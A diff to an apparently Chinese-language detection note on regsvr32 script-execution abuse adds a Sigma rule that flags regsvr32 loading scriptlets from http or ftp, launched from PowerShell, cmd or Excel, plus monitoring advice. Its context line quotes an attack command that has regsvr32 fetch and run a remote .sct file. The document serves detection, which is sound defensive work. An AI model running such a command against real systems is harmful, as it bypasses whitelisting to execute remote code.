@@ -93,7 +93,56 @@ CommandLine: regsvr32  /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct
 
 ## 检测规则/思路
 
-无具体检测规则。
+### sigma规则
+
+```yml
+title: Regsvr32 Anomaly
+status: experimental
+description: Detects various anomalies in relation to regsvr32.exe
+author: Florian Roth
+date: 2019/01/16
+references:
+    - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html
+tags:
+    - attack.t1117
+    - attack.defense_evasion
+    - attack.execution
+    - car.2019-04-002
+    - car.2019-04-003
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection1:
+        Image: '*\regsvr32.exe'
+        CommandLine: '*\Temp\\*'
+    selection2:
+        Image: '*\regsvr32.exe'
+        ParentImage: '*\powershell.exe'
+    selection3:
+        Image: '*\regsvr32.exe'
+        ParentImage: '*\cmd.exe'
+    selection4:
+        Image: '*\regsvr32.exe'
+        CommandLine:
+            - '*/i:http* scrobj.dll'
+            - '*/i:ftp* scrobj.dll'
+    selection5:
+        Image: '*\wscript.exe'
+        ParentImage: '*\regsvr32.exe'
+    selection6:
+        Image: '*\EXCEL.EXE'
+        CommandLine: '*..\..\..\Windows\System32\regsvr32.exe *'
+    condition: 1 of them
+fields:
+    - CommandLine
+    - ParentCommandLine
+falsepositives:
+    - Unknown
+level: high
+```
+
+### 建议
 
 通过进程监控来检测和分析regsvr32.exe的执行和参数。比较regsvr32.exe的近期调用与历史已知合法参数及已加载文件来确定是否有异常和潜在的攻击活动。在regsvr32.exe调用之前和之后使用的命令参数也可用于确定正在加载的脚本或者动态链接库的来源和目的。
 
